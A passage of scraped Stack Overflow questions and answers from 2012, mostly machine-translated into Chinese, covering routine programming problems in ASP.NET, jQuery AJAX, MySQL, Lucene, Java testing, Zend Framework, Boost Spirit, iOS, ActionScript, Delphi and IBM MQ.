[http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.table.aspx](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.table.aspx)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:18:22.337

有几种方法可以解决这个问题。

**1.**去掉and标签的`runat="server"`属性。这种方法的缺点是您将无法从服务器端修改这些标签。不过，您仍然可以修改任何标签。`table``tr``td`

**2.**从服务器端代码动态生成整个表。

HTML

```
<table runat="server" id="Table1">
</table> 
```

C# 服务器端代码

```
HtmlTableRow row = new HtmlTableRow();
HtmlTableCell cell = new HtmlTableCell();
cell.InnerText = "Text goes here.";
row.Cells.Add(cell);

this.Table1.Rows.Add(row); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:25:08.340

我设法通过制作一个简单的自定义控件来解决它：

```
public class HtmlTableCellPH : HtmlTableCell
{
    public HtmlTableCellPH()
    {
    }

    public HtmlTableCellPH(string tagName)
        : base(tagName)
    {
    }

    public override void RenderControl(HtmlTextWriter writer)
    {
        this.RenderChildren(writer);
    }
} 
```

现在 ascx 是：

```
...
<tr runat="server" ID="mytr">
    <td runat="server" ID="myCell1"></td>
    <ns:HtmlTableCellPH runat="server" ID="myPlaceholder"></ns:HtmlTableCellPH>
    <td runat="server" ID="myCell2"></td>
</tr>
... 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-12-12T17:47:58.117

当我遇到这个问题时，我使用的解决方案是`<tr>`用 an替换`<asp:literal>`并自己编写表格行的 HTML。

例子：

```
<asp:literal runat="server" ID="trRow" Mode="PassThrough" />
    <td runat="server" ID="myCell1"></td>
    <asp:PlaceHolder runat="server" ID="myPlaceholder"></asp:PlaceHolder>
    <td runat="server" ID="myCell2"></td>
</tr> 
```

然后在后面的代码中

```
Literal trRow = (Literal)e.Item.FindControl("trRow");
// ... some code here decides on CSS class I want to use
trRow.Text = string.Format("<tr class=\"{0}\">", strCssClass); 
```

# javascript - 是否可以停止当前执行的 Javascript 代码？

> ID：11396493
> 
> 赞同：2
> 
> 时间：2012-07-09T13:56:39.350
> 
> 标签：javascript, jquery, ajax

我不确定我要问的是否可能或正确的做事方式，但这里有。

我有一个网页，它使用 AJAX 从服务器加载一些数据并直观地显示它。用户可以选择使用页面上的两个按钮之一来“滚动”通过按周过滤的数据。这些按钮的代码类似于：

```
$("#leftButton").click(function () {
    clearCurrentlyDisplayedData();
    changeFilter(1);   //Or -1, or whatever.
    loadAndDisplayData();
} 
```

在这个（简化的）示例中，loadAndDisplayData() 将使用 AJAX 调用来获取此数据，然后在请求完成时显示它，例如：

```
$.get(
    "web/service/address", 
    function (data, textStatus, jqXHR) {
     //Display the data here
}); 
```

但是，当用户单击箭头滚动数据时，会出现问题。如果快速连续单击按钮两次，则将显示两周的数据，彼此重叠。

在收集数据之前，我**不想**禁用按钮 - 因为数据收集和显示确实需要一点时间，这会扼杀用户快速浏览网站的能力，并且很快就会变得烦人。

当用户单击其中一个按钮以防止加载两组数据时，是否可以终止任何当前正在执行的脚本或 AJAX 调用（或由于这些调用而调用的函数）？有没有其他方法可以解决这个问题？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T13:58:59.193

该[`jqXHR`对象有一个`abort()`方法](http://api.jquery.com/jQuery.ajax/#jqXHR)，您可以调用该方法来取消 AJAX 请求。

但是，这要求您保留对`$.get()`.

一种可能更简单的方法是在发出请求时增加全局计数器，并在请求完成时减少它。在您的`success`处理程序中，仅在计数器显示结果`=== 0`（例如，没有待处理的请求）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:03:02.077

*有没有其他方法可以解决这个问题？*

与其中止请求，不如在内部构造回调函数`$.get`以清除数据*并将*新数据显示为单个操作 - 即，在新数据准备好之前不清除数据。

Javascript 一次只处理一个事件/线程，因此每个 AJAX 响应将在它们到达时被串行处理。

# mysql - mysql query using 'OR' syntax

> ID：11396499
> 
> 赞同：1
> 
> 时间：2012-07-09T13:57:00.320
> 
> 标签：mysql, sql, database

Simple mysql question i am trying to write a query based on a criteria of four values however it does not seem to be working, here is and example of the query:

```
select * from table_1 where c=0 d=0 a=0 u=0 or c=1 d=1 a=1 u=1 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-07-09T13:58:03.623

Your `WHERE` logic is incorrect:

```
select * 
from table_1 
where (c=0 and d=0 and a=0 and u=0) 
or (c=1 and d=1 and a=1 and u=1) 
```

You need to group your statements together in parenthesis and still use `AND` for any conditions that need to be grouped together.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-07-09T14:15:52.403

Or, if these are always 0 and 1, you can use a trick to shorten the query:

```
where c+d+a+u = 0 or c*d*a*u = 1 
```

# lucene - Lucene - 如何修改查询对象的条款？

> ID：11396506
> 
> 赞同：0
> 
> 时间：2012-07-09T13:57:16.520
> 
> 标签：lucene, lucene.net

我想向基于 Lucene 的搜索引擎站点添加新字段，但是我希望能够在将查询传递给 Searcher 之前拦截并修改它们。

例如，每个文档都有该字段`userid`，因此您可以通过特定用户的 ID 搜索由特定用户创作的文档，例如，`foo bar userid:123`但是我想添加按用户名搜索的功能。

我想`user:RonaldMcDonald`向查询添加一个字段（**而不是**文档），但是我希望能够拦截该术语并将其替换为等效`userid:123`术语（我自己的代码将负责将“RonaldMcDonald”转换为“123”） .

这是我现在正在使用的简单代码：

```
Int32 get = (pageIndex + 1) * pageSize;

Query query;

try {

    query = _queryParser.Parse( queryText );

} catch(ParseException pex) {

    log.Add("Could not parse query.");
    throw new SearchException( "Could not parse query text.", pex );
}

log.Add("Parsed query.");

TopDocs result = _searcher.Search( query, get ); 
```

我查看了 Query 类，但看不到任何检索、删除或插入术语的方法。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T18:49:00.023

您可以继承 QueryParser 并覆盖`NewTermQuery`。

```
QP qp = new QP("user", new SimpleAnalyzer());
var s = qp.Parse("user:RonaldMcDonald data:[aaa TO bbb]"); 
```

`s`将在哪里`userid:123 data:[aaa TO bbb]`

```
public class QP : QueryParser
{
    Dictionary<string, string> _dict = 
       new Dictionary<string, string>(new MyComparer()) {{"RonaldMcDonald","123"} };

    public QP(string field, Analyzer analyzer) : base(field, analyzer)
    {
    }

    protected override Query NewTermQuery(Term term)
    {
        if (term.Field() == "user")
        {
            //Do your username -> userid mapping
            return new TermQuery(new Term("userid", _dict[term.Text()]));
        }
        return base.NewTermQuery(term);
    }

    //Case insensitive comparer
    class MyComparer : IEqualityComparer<string>
    {
        public bool Equals(string x, string y)
        {
            return String.Compare(x, y, true, CultureInfo.InvariantCulture)==0;
        }

        public int GetHashCode(string obj)
        {
            return obj.ToLower(CultureInfo.InvariantCulture).GetHashCode();
        }
    }
} 
```

# java - 测试工厂行为

> ID：11396508
> 
> 赞同：0
> 
> 时间：2012-07-09T13:57:16.573
> 
> 标签：java, unit-testing, factory-pattern

我想知道测试工厂行为代码的最佳实践是什么。在我的例子中，工厂创建了一些依赖实例，这些实例将传递给 FooBar 实例的构造函数。

```
public class FooBarFactory {
  private Dependency1 dependency1;
  private Dependency2Factory factory;

  public FooBarFactory(Dependency1 dependency1, Dependency2Factory factory) {
    this.dependency1 = dependency1;
    this.factory = factory;
  }

  public FooBar create() {
    return new FooBar(dependency1, factory.create(), new Dependency3());
  }
} 
```

依赖关系可以由其他一些工厂创建，也可以由被测工厂直接创建。

为了测试工厂行为，我现在要做的是在 FooBar 中创建一些受保护的 getter 来检索依赖项，这样我就可以断言构造函数注入并且正确创建了依赖项。

这是我不确定的地方。为了测试的目的添加一些吸气剂让我有点困扰，因为它破坏了封装。我也可以使用反射来检索字段值，但我通常认为这是不好的做法，因为它很容易被破坏。

任何人都可以提供有关此问题的见解吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T17:18:57.493

一种解决方案是模拟`FooBar`类并验证构造函数调用，通过该构造函数调用创建返回的实例`FooBarFactory#create()`。使用 JMockit 模拟 API，这样的测试看起来像：

```
public class FooBarFactoryTest
{
    @Injectable Dependency1 dep1;
    @Injectable Dependency2 dep2;
    @Cascading @Injectable Dependency2Factory dep2Factory;
    @Mocked FooBar mockFooBar;
    @Tested factory;

    @Test
    public void createFooBarWithProperDependencies()
    {
        assertNotNull(factory.create());

        new Verifications() {{ new FooBar(dep1, dep2, (Dependency3) withNotNull()); }};
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:10:54.213

As a Unit-Test you should test your unit (class) and just this.

The value created by a factory inside your factory should be tested on its unit-test. For example on your situation, it doesn't make sense to test what `dependency2Factory` return, because in order to `FooBar` work, `Dependency2Factory` should work too (in case it isn't configurable), if it is configurable you can provide your own mock and this would be enough.

And `Dependency2Factory` should be tested on a separated Unit-Test.

You don't test if the method `List.get(int index)` works every time you use a list in your implementation right?

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-07-09T14:45:14.267

How about mocking? Mock every dependency required to run the tested piece of code. There are a few good mock frameworks like mockito.

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-07-09T14:16:17.060

我想我想到的建议是反过来注入 FooBarFactory 的依赖项，以便它将 Dependency1 和 Dependency2Factory 作为构造函数参数或作为 setter 方法中的值。

# mysql - Mysql左连接来自同一个父表的多个列

> ID：11396509
> 
> 赞同：0
> 
> 时间：2012-07-09T13:57:33.110
> 
> 标签：mysql, join

我在使用 mysql 查询时遇到以下问题。

给定2张桌子

* * *

**人**

身份证 | 姓名

1 | 约翰·多伊

2 | 简·多伊

3 | 冥王星

* * *

**门票**

身份证 | 所有者 | 开瓶器 | 分配给

1 | 1 | 2 | 3

2 | 3 | 1 | 2

Owner、Opener、AssignedTo 是链接到人员 ID 的外键

* * *

我需要进行查询，用用户名替换 Owner、Opener、AssignedTo 列。

只有一列不是问题（使用左连接就足够了），但我无法收到以下输出

选择 * 从 ....

1 | 约翰·多伊 | 简·多伊 | 冥王星

2 | 冥王星 | 约翰·多伊 | 简·多伊

提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T14:00:54.493

您可以`Person`多次加入。

```
SELECT t1.Id, t2.Name AS owner, t3.Name AS opener, t4.Name AS assignedTo
FROM Tickets t1
LEFT JOIN Person t2 ON t1.Owner = t2.Id
LEFT JOIN Person t3 ON t1.Opener = t3.Id
LEFT JOIN Person t4 ON t1.AssignedTo= t4.Id 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-09T14:13:27.493

选择门票。`Id`, POwner.Name AS Owner, POpener.Name AS Opener, PAssignedTo.Name AS AssignedTo FROM `Tickets` JOIN `Person`AS POwner ON `Owner`= POwner.Id JOIN `Person`AS POpener ON `Opener`= POpener.Id JOIN `Person`AS PAssignedTo ON `AssignedTo`= PAssignedTo.Id

# php - ZF 中的 Layout 和 View 是什么？我应该何时使用谁的变量，为什么？

> ID：11396521
> 
> 赞同：2
> 
> 时间：2012-07-09T13:58:25.903
> 
> 标签：php, model-view-controller, zend-framework

我无法理解何时使用`Layout`' 变量以及何时使用`View`' 变量来获取页面上的页面段。这是他们的`Layout`包教程的图片（`$this`意味着`View`到处都是实例）： ![在此处输入图像描述](../Images/7b7394f1da242594873706c9a3ccc1d5.png)

为什么`Navigation`和`Content`段`Sidebar`作为`Layout`变量？

```
$this->layout()->nav; 
```

但是`HeadTitle`,是直接从 View 中得到的吗`HeadScript`？`HeadStylesheet`

```
$this->headTitle(); // I know that this is a placeholder view helper. 
                    // But this segment of the page logically belongs to Layout.
                    // and it has to be called smth like view->layout->placeholder 
```

为什么`Header`和来自于但不是属性的`Footer`某种`partial`方法？`View``Layout`

```
$this->partial('header.phtml'); 
```

我试图改变它们，两种方式都可以正常工作：

```
echo $this->nav; // I assigned navigation segment script to the View and it works; 
```

我试图将`Footer`段脚本分配给`Layout`它，它也可以工作：

```
$layout->footer = $footer;
echo $this->layout()->footer;  // it also works, it's displayed on the page 
```

任何方式都可以应用于页面上的任何变量。例如，在`Navigation`段中，我有很多变量要显示，我可以使用两种方式输出它们 - 一个变量 as`Layout`的属性，另一个变量 sa`View`的属性。

那么正确使用它们的规则是什么？什么时候应该使用`View`' 变量，什么时候使用 ' 变量`Layout`？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-07-09T16:52:52.287

我同意这在文档中不是很清楚，我认为根本没有`$this->layout()->nav`解释。可能有帮助的几点：

*   `$this->layout()`实际上是对布局视图助手的调用，它返回`Zend_Layout`.
*   `Zend_Layout`注册它自己的占位符助手（使用键'Zend_Layout'），并默认在其中创建一个'content'变量。
*   该类`Zend_Layout`有一个神奇的`__get()`方法，它将任何成员变量调用代理到其注册的占位符容器。所以调用`$this->layout()->content`是另一种写法`$this->placeholder('Zend_Layout')->content`
*   该类`Zend_Layout`还有一个魔术`__set()`方法，可以将存储的数据代理到占位符类。所以`$layout->footer = 'foo'`和调用一样`$this->placeholder('Zend_Layout')->footer = 'foo' in the view`

考虑到这一点：

> 为什么将导航、内容和侧边栏段作为布局变量获取？

因为这些正在访问存储在`Zend_Layout`'s 占位符中的数据。你也可以使用`$this->placeholder('Zend_Layout')->content`

> 但是 HeadTitle、HeadScript、HeadStylesheet 是直接从 View 中得到的吗？

这些是视图助手。

> 为什么 Header 和 Footer 来自 View 的某些部分方法而不是 Layout 的属性？

这是从其他模板访问内容的标准方式。

一般来说，假设使用视图对象是访问数据的正确方法。仅当您知道数据在布局占位符中时才使用布局对象/助手。

使用占位符而不是部分的优点是您可以在几个不同的地方访问和修改它们，包括在视图本身中。例如，假设您有一个侧边栏，它存储在部分中。如果您将其存储在 Zend_Layout 占位符中（例如在控制器插件中），您可以为控制器中的某些操作覆盖它：

```
public function someAction()
{
    $this->view->layout()->sidebar = 'Some other sidebar content';
} 
```

或在视图脚本本身中：

```
<?php $this->layout()->sidebar = 'Content for this page only'; ?> 
```

# mysql - 如何在服务器 MySQL Workbench 中查看我的所有数据库表？

> ID：11396523
> 
> 赞同：0
> 
> 时间：2012-07-09T13:58:36.183
> 
> 标签：mysql, mysql-workbench

我只能在服务器 MySQL Workbench 中看到我的数据库的两个表。我的数据库中有五个表，但是当我尝试从服务器访问我的表时，只有两个表。

我的数据库名称是电影，我有演员、流派、电影、评论、演员表，但是当我从 MYsql 命令行查询时，我得到了这些结果。

```
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| ep-store           |
| movie              |
| mysql              |
| performance_schema |
| sakila             |
| test               |
| world              |
+--------------------+
8 rows in set (0.01 sec)

mysql> use movie;
Database changed
mysql> show tables;
+-----------------+
| Tables_in_movie |
+-----------------+
| actor           |
| genre           |
+-----------------+
2 rows in set (0.05 sec) 
```

# c++ - 简单的解析器和生成器

> ID：11396526
> 
> 赞同：1
> 
> 时间：2012-07-09T13:58:48.363
> 
> 标签：c++, parsing, tokenize, boost-spirit

我需要从 C++ 对象解析和生成一些文本。

语法是：

```
command #param #param #param 
```

有一组命令，其中一些没有参数等。参数主要是数字。

问题是：我应该使用 Boost Spirit 来完成这项任务吗？或者只是简单地将每一行评估函数标记为从字符串比较与命令调用，读取其他参数并从中创建 cpp 对象？

如果您建议使用 Spirit 或任何其他解决方案，如果您能提供一些与我的问题类似的示例，那就太好了。我已经阅读并尝试了 Boost Spirit 文档中的所有示例。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-10T11:08:43.677

我在之前对问题“[使用 boost::bind 和 boost::function: 检索绑定变量类型”](https://stackoverflow.com/questions/7893768/using-boostbind-with-boostfunction-retrieve-binded-variable-type/7897417#7897417)[的回答](https://stackoverflow.com/a/7897417/85371)中或多或少地精确地实现了这一点。

使用 Boost Spirit的完整工作示例程序（需要*非常相似的语法*）在这里：**[https](https://gist.github.com/1314900)** ://gist.github.com/1314900 。您只想删除`/execute`语法的文字，因此编辑[第 41](https://gist.github.com/1314900#L41)行

```
 if (!phrase_parse(f,l, "/execute" > ( 
```

至

```
 if (!phrase_parse(f,l, ( 
```

示例脚本

```
WriteLine "bogus"
Write     "here comes the answer: "
Write     42
Write     31415e-4
Write     "that is the inverse of" 24 "and answers nothing"
Shutdown  "Bye" 9
Shutdown  "Test default value for retval" 
```

现在执行后会产生以下输出：

```
WriteLine('bogus');
Write(string: 'here comes the answer: ');
Write(double: 42);
Write(double: 3.1415);
Write(string: 'that is the inverse of');
Write(double: 24);
Write(string: 'and answers nothing');
Shutdown(reason: 'Bye', retval: 9)
Shutdown(reason: 'Test default value for retval', retval: 0) 
```

### 完整代码

出于存档目的：

```
#include <boost/spirit/include/qi.hpp>
#include <boost/spirit/include/phoenix.hpp>
#include <fstream>

namespace qi  = boost::spirit::qi;
namespace phx = boost::phoenix;

///////////////////////////////////
// 'domain classes' (scriptables)
struct Echo
{
    void WriteLine(const std::string& s) { std::cout << "WriteLine('"     << s << "');" << std::endl; }
    void WriteStr (const std::string& s) { std::cout << "Write(string: '" << s << "');" << std::endl; }
    void WriteInt (int i)                { std::cout << "Write(int: "     << i <<  ");" << std::endl; }
    void WriteDbl (double d)             { std::cout << "Write(double: "  << d <<  ");" << std::endl; }
    void NewLine  ()                     { std::cout << "NewLine();"                    << std::endl; }
} echoService;

struct Admin
{
    void Shutdown(const std::string& reason, int retval) 
    { 
        std::cout << "Shutdown(reason: '" << reason << "', retval: " << retval << ")" << std::endl;
        // exit(retval);
    }
} adminService;

void execute(const std::string& command)
{
    typedef std::string::const_iterator It;
    It f(command.begin()), l(command.end());

    using namespace qi;
    using phx::bind;
    using phx::ref;

    rule<It, std::string(), space_type> stringlit = lexeme[ '"' >> *~char_('"') >> '"' ];

    try
    {
        if (!phrase_parse(f,l, /*"/execute" >*/ (
                (lit("WriteLine")  
                    > stringlit  [ bind(&Echo::WriteLine, ref(echoService), _1) ])
              | (lit("Write") >> +(
                      double_    [ bind(&Echo::WriteDbl,  ref(echoService), _1) ] // the order matters
                    | int_       [ bind(&Echo::WriteInt,  ref(echoService), _1) ]
                    | stringlit  [ bind(&Echo::WriteStr,  ref(echoService), _1) ]
                ))
              | (lit("NewLine")  [ bind(&Echo::NewLine,   ref(echoService)) ])
              | (lit("Shutdown")  > (stringlit > (int_ | attr(0))) 
                                 [ bind(&Admin::Shutdown, ref(adminService), _1, _2) ])
            ), space))
        {
            if (f!=l) // allow whitespace only lines
                std::cerr << "** (error interpreting command: " << command << ")" << std::endl;
        }
    }
    catch (const expectation_failure<It>& e)
    {
        std::cerr << "** (unexpected input '" << std::string(e.first, std::min(e.first+10, e.last)) << "') " << std::endl;
    }

    if (f!=l)
        std::cerr << "** (warning: skipping unhandled input '" << std::string(f,l) << "')" << std::endl;
}

int main()
{
    std::ifstream ifs("input.txt");

    std::string command;
    while (std::getline(ifs/*std::cin*/, command))
        execute(command);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-07-09T14:39:27.893

对于简单格式化、易于测试的输入，标记化就足够了。
标记化时，您可以从输入中读取一行并将其放入字符串流（iss）中。从 iss 中，您读取第一个单词并将其传递给命令工厂，该命令工厂为您创建正确的命令。然后你可以将iss传递给新命令的readInParameters函数，这样每个命令就可以解析自己的参数并检查所有参数是否有效。

未经测试的代码示例：

```
std::string line;
std::getline(inputStream, line);
std::istringstream iss(line);
std::string strCmd;
iss >> strCmd;
try
{
  std::unique_ptr<Cmd> newCmd = myCmdFactory(strCmd);
  newCmd->readParameters(iss);
  newCmd->execute();
  //...
}
catch (std::exception& e) 
{ 
  std::cout << "Issue with received command: " << e.what() << "\n"; 
} 
```

# php - 渲染实体字段，例如与 Symfony2 中的类别关联的复选框

> ID：11396527
> 
> 赞同：1
> 
> 时间：2012-07-09T13:58:50.110
> 
> 标签：php, symfony, twig

我有一个通过 ManyToOne 关联与类别关联的标签。而且我需要在模板上呈现所有标签，但有一个条件 - 它们都应该由带有链接的类别划分。应该有这样的东西：

```
<label>Some category name</label>
   <input type="checkbox">Tag1
   <input type="checkbox">Tag2
   <input type="checkbox">Tag3

<label>Some different category name</label>
   <input type="checkbox">Tag1
   <input type="checkbox">Tag2
   <input type="checkbox">Tag3 
```

..等等。谁能帮帮我）

# android - 安卓应用更新

> ID：11396531
> 
> 赞同：3
> 
> 时间：2012-07-09T13:59:00.297
> 
> 标签：android

我在 android 市场上有一个应用程序，它利用数据库以及共享首选项。我需要更新我的应用程序以添加更多功能和新表

我已经更新了助手类的 upgrade() 方法中的数据库部分。

请帮助解释android应用程序更新的过程。幕后发生了什么。我们在市场上提交更新的apk后如何更新应用程序

除了数据库还有什么需要注意的

请帮忙，很紧急

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-07-09T14:20:56.077

在大约 2 周前的 Google IO 2012 期间，他们提出了一种从 Play 商店更新 Android Apk 的新方法。所以基本上你只需下载所有新内容并将其添加到已经可用的 apk 中。因此，现在升级 apk 所需的数据将减少 70%。所以你的数据库将被更新。只会下载新数据并将其添加到应用程序中。共享的偏好不会被删除，即使在更新后它们也会保持保存。我希望我能帮上忙。

# iphone - iOS 中的 addSublayer 和 renderInContext 将如何工作

> ID：11396541
> 
> 赞同：3
> 
> 时间：2012-07-09T13:59:25.913
> 
> 标签：iphone, ios5, calayer, render

当我按照以下方式编写代码时..

```
- (void)drawRect:(CGRect)rect
{
    CGContextRef context = UIGraphicsGetCurrentContext();
    CGContextSetBlendMode(context, kCGBlendModeDifference);

    sublayer = [CALayer layer];
    sublayer.backgroundColor = [UIColor redColor].CGColor;
    sublayer.opaque = NO;
    sublayer.frame = CGRectMake(30, 30, 250, 200);
    [sublayer renderInContext:context];

    sublayer1 = [CALayer layer];
    sublayer1.opaque = NO;
    sublayer1.backgroundColor = [UIColor greenColor].CGColor;
    sublayer1.frame = CGRectMake(120, 120, 100, 250);
    [sublayer1 renderInContext:context];

} 
```

我得到如下第一张图片

![在此处输入图像描述](../Images/2942876dfce7e012cf667e5125e2a0c8.png) ![在此处输入图像描述](../Images/cd611d45db97ff9c7f986e8169465fcb.png)

sublayer, sublayer1 的位置不正确，因为我已经为它们设置了框架。它们的交集是混合色。为什么他们不设置实际位置？

但是当我使用时`addSublayer`，我得到了第二张图片。这里 sublayer, sublayer1 的位置是正确的。它们的交集不是混合颜色。发生了那样的事。

为什么我创建子图层是，当我拖动子图层时，它们的交叉部分必须是混合颜色。请任何人向我解释。

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T19:03:52.770

这就是您的代码中发生的情况：在第一种情况下，您只是在视图底层的图形上下文中绘制了图层。这就是 drawRect 所做的。框架的原点不会影响这一点，因为它只是将子层定位在其父层内。但是在这里，图层永远不会添加到父图层，所以原点什么都不做，两个形状都出现在 0, 0 处。

在第二种情况下，首先发生的事情与以前完全相同，但是因为您还将图层添加到图层层次结构中，所以它们在视图的底层之上再次渲染，在指定位置。每个子图层都在其自己的上下文中渲染，因此您在 drawRect 中设置的混合模式对它们没有影响。

实际上，如果您只想获得两个矩形的图像，则根本不需要子图层。您可以直接在视图底层的 drawRect 中绘制它们：

```
- (void)drawRect:(CGRect)rect
{
    CGContextRef ctx = UIGraphicsGetCurrentContext();
    CGContextSetBlendMode(ctx, kCGBlendModeDifference);

    CGContextSetFillColorWithColor(ctx, [UIColor redColor].CGColor);
    CGRect rect1 = CGRectMake(30, 30, 250, 200);
    CGContextFillRect(ctx, rect1);

    CGContextSetFillColorWithColor(ctx, [UIColor greenColor].CGColor);
    CGRect rect2 = CGRectMake(120, 120, 100, 250);
    CGContextFillRect(ctx, rect2);
} 
```

编辑（因为问题已被编辑）：

您可以使用这种方法来拖动图层，如下所示：

*   使用上述混合模式和绘图命令在新图层上为每个移动图层绘制一个矩形或在其顶部查看
*   将移动层的当前帧用于绘图矩形
*   确保新的顶层没有收到触摸
*   每当交互层的位置改变时重绘新层

# actionscript-3 - as3中的点积实现

> ID：11396542
> 
> 赞同：0
> 
> 时间：2012-07-09T13:59:27.677
> 
> 标签：actionscript-3, actionscript

我正在将一个简单的点积算法实现到 actionscript 3.0 代码中。这是基本示例。

(1, 2, 3) • (7, 9, 11) = 1×7 + 2×9 + 3×11 = 58

我这里有一个简单的代码。

```
public var array1:Array = [1, 2, 3]; // 4, 10, 18
    public var array2:Array = [4, 5, 6];
    public var answer:Number = 0;

    public function Algorithm() 
    {
        multiply();
    }
    public function multiply()
    {
        var temp:Number = 0 ;
        while (temp < array1.length) 
        {
            answer = array1[temp] * array2[temp];
            temp++;

        }
        trace(answer += answer);
    } 
```

但是当我追踪它时......而不是32，它变成了36......看起来它再次为最后一个答案添加了4。

它困扰着我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:02:59.143

每次数组循环时，您都在覆盖 answer。唯一存储的值是最后一个 (3*6 = 18)。在您的跟踪中，您实际上将其翻了一番，每次都给您 36。尝试这个：

```
answer = answer + ( array1[temp] * array2[temp] ); 
```

然后在最后追踪答案。

# ios - 如何从不同的 .xib 文件中导航一个 webview 两个另一个 webview

> ID：11396544
> 
> 赞同：0
> 
> 时间：2012-07-09T13:59:34.560
> 
> 标签：ios, webview

我有一个 webview

```
 1\. webview1 
       -webview1.xib
       - webview1delegate.h
       - webview1delegate.m 
       - webview1Controller.h
       - webview1Controller.h
  2\. webview2
       -webview2controller.h
       -webview2controller.m 
```

我想在 webview2controller.m 文件中指定要加载到 webview1.xib 文件 webview 中的 url。有人帮我吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-09T14:05:01.777

在 webView 委托上

```
- (BOOL)webView:(UIWebView *)webView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType
{
   if([[request.URL description] isEqualToString:@"your link"])
     //load other xib
} 
```

# delphi - TWebBrowser 中的 Google 街景

> ID：11396546
> 
> 赞同：2
> 
> 时间：2012-07-09T13:59:40.670
> 
> 标签：delphi, google-maps, twebbrowser, google-street-view

有没有人成功让 StreetView 在 TWebBrowser 控件中显示？

我想以编程方式构建一个 Url 并让它以简单的 Delphi 形式显示。

到目前为止，这是我对该表格的内容：

```
unit frmSView;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, OleCtrls, SHDocVw, StdCtrls;

type
  TfrmStreetView = class(TForm)
    browserStreetView: TWebBrowser;
    txtAddress: TEdit;
    procedure txtAddressExit(Sender: TObject);
    procedure ShowSV(Lat: string; Lon: string);
  private
    // private declarations
  public
    // public declarations
  end;

var
  frmStreetView: TfrmStreetView;

implementation

{$R *.dfm}

procedure TfrmStreetView.ShowSV(Lat: string; Lon: string);
var
  Addr: string;
  Flags: OleVariant;
begin
  Addr := 'http://maps.google.com/maps?q=&&layer=c&&cbll=' + Lat + ',' + Lon + '&&cbp=12,0,0,0,0&&output=svembed';
  browserStreetView.Navigate(Addr, Flags, Flags, Flags, Flags);
  txtAddress.Text := Addr;
  ShowModal;
end;

procedure TfrmStreetView.txtAddressExit(Sender: TObject);
var
  Flags: OleVariant;
begin
  browserStreetView.Navigate(txtAddress.Text, Flags, Flags, Flags, Flags);
end;

end. 
```

当表格显示：

*   如果该位置没有街景信息，我会获得常规地图视图。
*   如果有街景信息（在另一个浏览器窗口中验证），它只会显示一个灰屏。

我猜 Flash 播放器没有加载。

你们有什么想法吗？

问候，

西蒙

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-07-09T14:08:45.107

Have you looked at the [DelphiMaps project](http://code.google.com/p/delphimaps/)? Description:

> The DelphiMaps library is a set of Delphi components that aim to make it easy for developers to incorporate GIS functionality in their applications.
> 
> The package contains wrappers for:
> 
> *   Google Maps API (v3)
> *   Google/Openstreetmap Static Maps
> *   Google Geocoding API
> *   Google Directions API
> *   Google StreetView

Rodrigo Ruz posted a [fully functional example](http://theroadtodelphi.wordpress.com/2010/08/07/using-the-google-maps-api-v3-from-delphi-part-i-basic-functionality/) on his blog in 2010.

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-07-09T14:21:24.143

自从我用 Delphi 编写任何东西以来已经有很长时间了，但如果我没记错的话，TWebBrowser 控件是您系统上任何版本的 Internet Explorer 的浏览器部分。“浏览器部分”是指 HTML 渲染器和 Javascript 解释器，但称为 Internet Explorer 的完整程序远不止这些。它还具有插件，例如 Flash，以及在需要时加载这些插件的一些管理逻辑。

我的建议是，您可以使用 V3 API 创建一个简单的页面，而不是加载 maps.google.com，该页面在没有 Flash 的情况下实现了街景（纯 Javascript）。尝试将此页面加载到您的 TWebBrowser 控件中，然后将街景小人放在不错的地方：

[http://maps.forum.nu/v3/gm_streetview_V3.html](http://maps.forum.nu/v3/gm_streetview_V3.html)

# c# - 部署后无法运行 Websphere MQ 应用程序

> ID：11396547
> 
> 赞同：0
> 
> 时间：2012-07-09T13:59:48.470
> 
> 标签：c#, .net, ibm-mq

再会。我开发了一个可以在我的本地机器上成功运行的应用程序，但是在迁移到生产环境时遇到了问题。

错误如下：

> System.IO.FileNotFoundException：无法加载文件或程序集“IBM.XMS.Admin，版本=2.5.0.0，文化=中性，PublicKeyToken=d2666ab12fca862b”或其依赖项之一。该系统找不到指定的文件。文件名：“IBM.XMS.Admin，版本=2.5.0.0，文化=中性，PublicKeyToken=d2666ab12fca862b”

我知道这个文件在哪里 - C:\Prog... - 我的 .Net 应用程序只是引用了有效的 IBM.XMS.dll。当我部署和运行时，我得到了上面的错误。

我也使用了以下安装说明并重新启动了系统：http: [//publib.boulder.ibm.com/infocenter/wmqv7/v7r0/topic/com.ibm.mq.csqzav.doc/un10290_.htm](http://publib.boulder.ibm.com/infocenter/wmqv7/v7r0/topic/com.ibm.mq.csqzav.doc/un10290_.htm)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-10T06:32:58.713

